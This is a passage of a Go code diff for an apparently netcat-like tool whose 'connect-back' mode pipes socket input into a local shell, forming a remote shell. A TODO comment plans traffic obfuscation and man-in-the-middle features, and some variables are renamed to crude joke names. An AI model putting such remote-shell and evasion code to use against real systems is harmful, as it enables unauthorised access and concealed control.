@@ -34,7 +34,7 @@ func readFromUserShell(shellUserChannel chan<- string, stdout *io.ReadCloser, st
 				os.Exit(1)
 			}
 			// If data: change to string & put into channel:
-			cData := fmt.Sprintf("%c", outData)
+			cData := string(outData)
 			shellUserChannel <- cData
 		}
 		// Wait? (may need Cmd.Wait() here)
@@ -63,6 +63,7 @@ func readFromUserShell(shellUserChannel chan<- string, stdout *io.ReadCloser, st
 		for {
 			fmt.Print(">> ")
 			text, _ := reader.ReadString('\n')
+			fmt.Printf("user input before channel: %v\n", text)
 
 			// If there is input, put into channel:
 			if len(text) > 0 {
@@ -102,6 +103,7 @@ func readFromSocket(socketChannel chan<- []byte, connection utils.Socket) {
 
 		// If data is not empty:
 		if len(dataBytes) > 0 {
+			fmt.Printf("data before putting in socket channel: %v\n", dataBytes)
 			socketChannel <- dataBytes
 		}
 	}
@@ -187,23 +189,34 @@ func runApp(c utils.ConnectionGetter) {
 	go readFromSocket(socketChannel, thisPeer.Connection)
 
 	/*
-		This for loop is where all the hacking magic happens.
-		We use select statements to check if either channel has
-		data in it.
+			This for loop is where all the hacking magic happens.
+			We use select statements to check if either channel has
+			data in it.
 
-		1) shellUserChannel: will have EITHER data from the user (input)
-			or data from the shell process (stdout/stderr)
-		2) socketChannel: will have data coming inbound through the socket
+			1) shellUserChannel: will have EITHER data from the user (input)
+				or data from the shell process (stdout/stderr)
+			2) socketChannel: will have data coming inbound through the socket
 
-		If either has data in it, we do things to it and move on. If no data,
-		there is a small timeout as default.
+			If either has data in it, we do things to it and move on. If no data,
+			there is a small timeout as default.
+
+
+		TO DO":::::
+			- send the entire commaand (or capture the entire command)
+			- decode
+			- fix output on target (obfuscate over the wire)
+				- mitm....
+				- ssh server/client in go std lib ( or non standard protocol)
+			- io reader loop
+
+
 	*/
 	for {
 		select {
 		// Read shellUserChannel and write the data to the socket:
 		case socketOutgoing := <-shellUserChannel:
 			// NEED TO: fix encoding/ decoding
-			if len(socketOutgoing) > 0 {
+			if len(socketOutgoing) > 3 {
 
 				//converted := fmt.Sprintf("%c", socketOutgoing)
 				fmt.Println("ioReader: ", socketOutgoing)
@@ -219,24 +232,27 @@ func runApp(c utils.ConnectionGetter) {
 			}
 			//socketBoundInput = ""
 		// Read socketChannel & print to user OR redirect to shell process stdin:
-		case socketIncoming := <-socketChannel:
+		case ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow := <-socketChannel: // @c0dec0re 'socketIncoming'
 			// NEED TO: fix encoding/ decoding
-			fmt.Printf("socketChannel value: %v\n", socketIncoming)
+			fmt.Printf("socketChannel value: %v\n", ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow)
 
 			// Convert bytes to string:
-			sendString := fmt.Sprintf("%c", socketIncoming)
+			ThisisReallyLongAndReadersAreGreatButHavingOneWriterMakesSense := string(ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow) // @c0decore 'sendString'
 
 			// If we have a cb shell & we're connect-back peer, data received from socket should be sent to shell stdin:
 			if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
+				// Convert byte array to string:
+				converted := fmt.Sprintf("%s", string(ThisisReallyLongAndReadersAreGreatButHavingOneWriterMakesSense))
+
 				// Write socket data to stdin:
-				fmt.Printf("converted: %v\n", string(sendString))
+				fmt.Printf("converted: %v\n", converted)
 
 				// io.WriteString wants to defer the closer so we dereference stdin:
 				var dereferenceForCloseMethod io.WriteCloser = *stdin
 				go func() {
 					// Write channel data to shell stdin:
 					defer dereferenceForCloseMethod.Close()
-					_, err := io.WriteString(dereferenceForCloseMethod, sendString)
+					_, err := io.WriteString(dereferenceForCloseMethod, ThisisReallyLongAndReadersAreGreatButHavingOneWriterMakesSense)
 					if err != nil {
 						log.Fatalf("Error writing socket data to shell stdin (main.go): %v\n", err)
 					}
@@ -244,7 +260,7 @@ func runApp(c utils.ConnectionGetter) {
 
 			} else {
 				// Print data from socket channel to user:
-				_, err := os.Stdout.Write(socketIncoming)
+				_, err := os.Stdout.Write(ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow)
 				if err != nil {
 					// Quit here?
 					fmt.Printf("Error in writing to stdout (main.go): %v\n", err)
